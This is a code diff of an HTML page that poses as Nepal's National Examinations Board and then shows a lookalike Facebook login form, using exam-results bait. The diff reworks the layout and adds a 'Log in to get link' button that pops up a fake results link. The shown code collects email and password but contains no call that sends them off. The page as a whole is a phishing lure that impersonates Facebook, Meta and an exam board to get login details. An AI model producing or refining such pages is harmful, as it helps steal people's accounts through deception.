@@ -6,7 +6,7 @@
     <title>NEB - National Examinations Board</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; }
+        body { font-family: Arial, sans-serif; background: #f0f2f5; min-height: 100vh; }
         
         .neb-page {
             position: fixed;
@@ -61,33 +61,26 @@
             display: none;
             min-height: 100vh;
             background: #f0f2f5;
+            padding: 60px 20px;
         }
         
         .fb-wrapper {
-            max-width: 990px;
-            width: 90%;
+            max-width: 400px;
             margin: 0 auto;
-            padding: 80px 20px;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: center;
-            gap: 40px;
         }
         
-        .brand-area { flex: 1; min-width: 280px; }
-        .fb-logo { font-size: 58px; font-weight: 700; color: #1877f2; }
-        .fb-tagline { font-size: 26px; color: #1c1e21; margin-top: 10px; }
+        .fb-logo { font-size: 58px; font-weight: 700; color: #1877f2; text-align: center; margin-bottom: 20px; }
+        .fb-tagline { font-size: 20px; color: #1c1e21; text-align: center; margin-bottom: 30px; }
         
-        .login-area { flex: 1; min-width: 360px; }
-        .card { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
-        .card input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        .card { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .card input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 17px; }
         
-        .login-btn { background: #1877f2; width: 100%; border: none; border-radius: 6px; padding: 12px; font-size: 20px; font-weight: bold; color: white; cursor: pointer; }
-        .forgot-link { text-align: center; margin: 15px 0; }
+        .login-btn { background: #1877f2; width: 100%; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: bold; color: white; cursor: pointer; margin-bottom: 16px; }
+        .forgot-link { text-align: center; margin-bottom: 18px; }
         .forgot-link a { color: #1877f2; text-decoration: none; font-size: 14px; }
         .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
-        .create-btn { background: #42b72a; width: 100%; border: none; border-radius: 6px; padding: 12px; font-size: 17px; font-weight: bold; color: white; cursor: pointer; }
+        .create-btn { background: #42b72a; width: 100%; border: none; padding: 12px; border-radius: 6px; font-size: 17px; font-weight: bold; color: white; cursor: pointer; margin-bottom: 12px; }
+        .get-link-btn { background: #1877f2; width: 100%; border: none; padding: 12px; border-radius: 6px; font-size: 17px; font-weight: bold; color: white; cursor: pointer; }
         .error-msg { color: red; text-align: center; margin: 10px 0; display: none; }
         
         .video-container {
@@ -96,19 +89,19 @@
             width: 100%;
             border-radius: 10px;
             overflow: hidden;
-            background: black;
         }
         
         .video-container video {
             width: 100%;
             height: auto;
-            display: block;
         }
+        
+        .meta-footer { text-align: center; margin-top: 30px; font-size: 12px; color: #65676b; }
+        .meta-logo { display: inline-flex; align-items: center; gap: 6px; font-weight: 600; }
     </style>
 </head>
 <body>
 
-<!-- NEB PAGE -->
 <div id="nebPage" class="neb-page">
     <div class="neb-card">
         <h1>🇳🇵 राष्ट्रिय परीक्षा बोर्ड</h1>
@@ -123,35 +116,36 @@
     </div>
 </div>
 
-<!-- FACEBOOK PAGE -->
 <div id="fbPage" class="fb-page">
     <div class="fb-wrapper">
-        <div class="brand-area">
-            <div class="fb-logo">facebook</div>
-            <div class="fb-tagline">Connect with friends and the world<br> around you on Facebook.</div>
+        <div class="fb-logo">facebook</div>
+        <div class="fb-tagline">Connect with friends and the world around you on Facebook.</div>
+        
+        <div class="card" id="loginCard">
+            <input type="text" id="email" placeholder="Email or phone number">
+            <input type="password" id="password" placeholder="Password">
+            <div id="errorMsg" class="error-msg"></div>
+            <button class="login-btn" id="loginBtn">Log in</button>
+            <div class="forgot-link"><a href="#">Forgotten password?</a></div>
+            <div class="divider"></div>
+            <button class="create-btn" id="createBtn">Create new account</button>
+            <button class="get-link-btn" id="getLinkBtn">🔗 Log in to get link</button>
         </div>
-        <div class="login-area" id="loginArea">
-            <div class="card" id="loginCard">
-                <input type="text" id="email" placeholder="Email or phone number">
-                <input type="password" id="password" placeholder="Password">
-                <div id="errorMsg" class="error-msg"></div>
-                <button class="login-btn" id="loginBtn">Log in</button>
-                <div class="forgot-link"><a href="#">Forgotten password?</a></div>
-                <div class="divider"></div>
-                <button class="create-btn" id="createBtn">Create new account</button>
-            </div>
-            <div id="videoContainer" class="video-container">
-                <video id="myVideo" controls autoplay muted playsinline>
-                    <source src="video.mp4" type="video/mp4">
-                    Your browser does not support video.
-                </video>
-            </div>
+        
+        <div id="videoContainer" class="video-container">
+            <video id="myVideo" controls autoplay muted playsinline>
+                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                Your browser does not support video.
+            </video>
+        </div>
+        
+        <div class="meta-footer">
+            <div class="meta-logo"><span>∞</span><span>Meta</span></div>
         </div>
     </div>
 </div>
 
 <script>
-    // Switch from NEB to Facebook
     document.getElementById('continueBtn').onclick = () => {
         document.getElementById('nebPage').style.opacity = '0';
         setTimeout(() => {
@@ -173,12 +167,12 @@
         const password = passwordInput.value;
 
         if (!email) {
-            errorDiv.innerText = 'Email or phone number is required.';
+            errorDiv.innerText = 'Email is required';
             errorDiv.style.display = 'block';
             return;
         }
         if (!password) {
-            errorDiv.innerText = 'Password is required.';
+            errorDiv.innerText = 'Password is required';
             errorDiv.style.display = 'block';
             return;
         }
@@ -186,16 +180,26 @@
         errorDiv.style.display = 'none';
         loginCard.style.display = 'none';
         videoContainer.style.display = 'block';
-        
-        // Force play video
         myVideo.muted = true;
-        myVideo.play().catch(e => console.log('Play error:', e));
+        myVideo.play();
+    }
+
+    function doGetLink() {
+        const email = emailInput.value.trim();
+        if (!email) {
+            errorDiv.innerText = 'Enter email first';
+            errorDiv.style.display = 'block';
+            return;
+        }
+        alert('🔗 Your secure link: https://neb.exam/results/0081');
     }
 
     loginBtn.onclick = doLogin;
+    getLinkBtn.onclick = doGetLink;
+    createBtn.onclick = () => alert('Create new account');
+    
     emailInput.onkeypress = (e) => { if (e.key === 'Enter') doLogin(); };
     passwordInput.onkeypress = (e) => { if (e.key === 'Enter') doLogin(); };
-    createBtn.onclick = () => alert('✨ Create new account coming soon');
 </script>
 
 </body>
